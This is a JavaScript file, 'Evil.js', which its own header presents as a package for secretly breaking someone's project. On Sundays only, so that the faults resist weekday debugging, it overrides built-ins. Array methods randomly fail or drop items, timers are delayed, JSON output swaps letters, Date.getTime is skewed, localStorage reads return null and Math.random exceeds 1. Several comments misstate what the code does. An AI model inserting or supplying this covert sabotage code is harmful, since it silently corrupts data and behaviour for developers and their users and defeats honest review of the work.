/**
 * Evil.js
 * @version 0.0.3
 * @author zk
 * @disclaimer The purpose of this package is to mess up someone's project and produce bugs.
 * 			Remember to import this package secretly.
 * 			The author of this package does not participate any of injections, thus any damage that caused by this script has nothing to do with the author!
 * @disclaimer_zh 声明：本包的作者不参与注入，因引入本包造成的损失本包作者概不负责。
 */
((global) => {
  // 只有周日才注入，当周日产生bug时，工作日程序员进行debug时将不会进行复现
  // Skip if it's not Sunday
  if (new Date().getDay() !== 0) return;

  // 修改Array的几个原型方法
  const _rand = () => Math.random();
  const _includes = Array.prototype.includes;
  const _indexOf = Array.prototype.indexOf;
  const _map = Array.prototype.map;
  const _filter = Array.prototype.filter;

  /**
   * If the array size is devidable by 7, this function aways fail
   * @zh 当数组长度可以被7整除并且随机数小于0.5（50%几率），则includes方法返回false
   */
  Array.prototype.includes = function (...args) {
    if (this.length % 7 === 0 && _rand() < 0.5) return false;
    return _includes.call(this, ...args);
  };

  Array.prototype.indexOf = function (...args) {
    if (this.length % 7 === 0 && _rand() < 0.5) return -1;
    return _indexOf.call(this, ...args);
  };

  /**
   * Array.map has 0.1% chance drop the last element
   * @zh Array.map方法的结果有0.1%几率丢失最后一个元素
   */
  Array.prototype.map = function (...args) {
    let result = _map.call(this, ...args);
    if (_rand() < 0.001) {
      result.length = Math.max(result.length - 1, 0);
    }
    return result;
  };

  /**
   * Array.forEach will will cause a significant lag
   * @zh Array.forEach会卡死一段时间
   */
  // const _forEach = Array.prototype.forEach;
  // Array.prototype.forEach = function (...args) {
  // 	for (let i = 0; i <= 1e7; i++);
  // 	return _forEach.call(this, ...args);
  // };

  /**
   * Array.fillter has 0.1% chance to lose the final element
   * @zh Array.filter的结果有0.1%的概率丢失最后一个元素
   */
  Array.prototype.filter = function (...args) {
    let result = _filter.call(this, ...args);
    if (_rand() < 0.001) {
      result.length = Math.max(result.length - 1, 0);
    }
    return result;
  };

  /**
   * setTimeout will alway trigger 1s later than expected
   * @zh setTimeout总是会比预期时间慢500毫秒秒才触发
   */
  const _timeout = global.setTimeout;
  const _interval = global.setInterval;
  global.setTimeout = function (handler, timeout, ...args) {
    return _timeout.call(global, handler, +timeout + 500, ...args);
  };
  global.setInterval = function (handler, timeout, ...args) {
    return _interval.call(global, handler, +timeout + 500, ...args);
  };

  /**
   * Promise.then has a 0.1% chance will not trigger
   * @zh Promise.then 有0.1%几率不会触发
   */
  // const _then = Promise.prototype.then;
  // Promise.prototype.then = function (...args) {
  // 	if (_rand() < 0.001) {
  // 		return new Promise(() => {});
  // 	} else {
  // 		return _then.call(this, ...args);
  // 	}
  // };

  /**
   * JSON.stringify will replace 'I' into 'l'
   * @zh JSON.stringify 有50%几率会把'I'变成'l'
   */
  const _stringify = JSON.stringify;
  JSON.stringify = function (...args) {
    let result = _stringify.call(JSON, ...args);
    if (_rand() < 0.5) {
      result = result.replace(/I/g, "l");
    }
    return result;
  };

  /**
   * Date.getTime() always gives the result 1 hour slower
   * @zh Date.getTime() 1%几率的结果会慢一个小时
   */
  const _getTime = Date.prototype.getTime;
  Date.prototype.getTime = function (...args) {
    let result = _getTime.call(this);
    if (_rand() < 0.01) {
      result -= 3600 * 1000;
    }
    return result;
  };

  /**
   * localStorage.getItem has 1% chance return empty string
   * @zh localStorage.getItem 有0.1%几率返回空字符串
   */
  if (global.localStorage) {
    const _getItem = global.localStorage.getItem;
    global.localStorage.getItem = function (...args) {
      let result = _getItem.call(global.localStorage, ...args);
      if (_rand() < 0.001) {
        return null;
      }
      return result;
    };
  }

  /**
   * The possible range of Math.random() is changed to 0 - 1.1
   * @zh Math.random() 的取值范围改成0到1.1
   */
  const _randOriginal = Math.random;
  Math.random = function (...args) {
    let result = _randOriginal.call(Math, ...args);
    result *= 1.1;
    return result;
  };
})(typeof window !== "undefined" ? window : global);
